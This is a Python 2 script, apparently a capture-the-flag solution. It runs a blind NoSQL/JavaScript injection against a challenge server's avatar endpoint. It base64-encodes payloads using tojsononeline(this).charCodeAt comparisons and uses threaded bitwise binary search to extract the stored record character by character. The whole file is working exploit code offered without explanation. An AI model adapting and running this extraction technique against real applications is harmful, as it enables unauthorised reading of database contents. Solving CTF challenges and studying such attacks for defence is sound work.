#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import urllib
import requests
import base64
from time import sleep
import threading

maxthreads = 15

user_agent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20071008 Ubuntu/7.10 (gutsy) Firefox/2.0.0.6'
headers = { 'User-Agent' : user_agent, 'Connection': 'keep-alive'}

maxlength = 200

string_true = 'mojo'
string_error = 'Error with SQL query'

def cleanList(items):
	a = [x if x!=None else '_' for x in items]
	b = ''.join(a)
	return b.rstrip('_')


def worker(i):
	ct = threading.currentThread()
	threadLimiter.acquire()

	global finished

	if finished!=False and i>finished:
		threadLimiter.release()
		return

	bits = 0
	for bit in range(7, -1, -1):
		if finished!=False and i>finished:
			threadLimiter.release()
			return

		bitnumber = bits + pow(2, bit)

		#url = 'http://challenges.ka0labs.org:31337/avatar/'+ base64.b64encode(urllib.unquote('%22;tojsononeline(this).charCodeAt('+str(i)+')>='+str(bitnumber)+';%00'))

		payload = '%22;tojsononeline(this).charCodeAt(%s)>=%s;%00' % (i, bitnumber)
		url = 'http://challenges.ka0labs.org:31337/avatar/' + base64.b64encode(urllib.unquote(payload))
		while True:
			try:
				r = requests.get(url, headers=headers, allow_redirects=False)
				data = r.text
			except:
				print("\n[+] Request Error! ")
				sleep(1)
				continue
			break

		if string_error in data:
			print("\nERROR")
			finished = True
			sys.exit()
			continue

		elif string_true in data:
			bits += pow(2, bit)

		else:
			pass

	if bits == 0:
		finished = i if finished==False or i<finished else finished
	else:
		result[i] = chr(bits)
		string = cleanList(result)
		sys.stdout.write('\r'+string)
		sys.stdout.flush()

	threadLimiter.release()


def execute():
	threads = []

	for i in range(maxlength):
		tr = threading.Thread(target=worker, args=(i,))
		threads.append(tr)
		tr.start()

	for x in threads:
		x.join()

	return result


threadLimiter = threading.BoundedSemaphore(maxthreads)

global finished
finished = False

result = [None] * maxlength
result = execute()
print('\n'+ ''.join(result[:finished])+'\n')
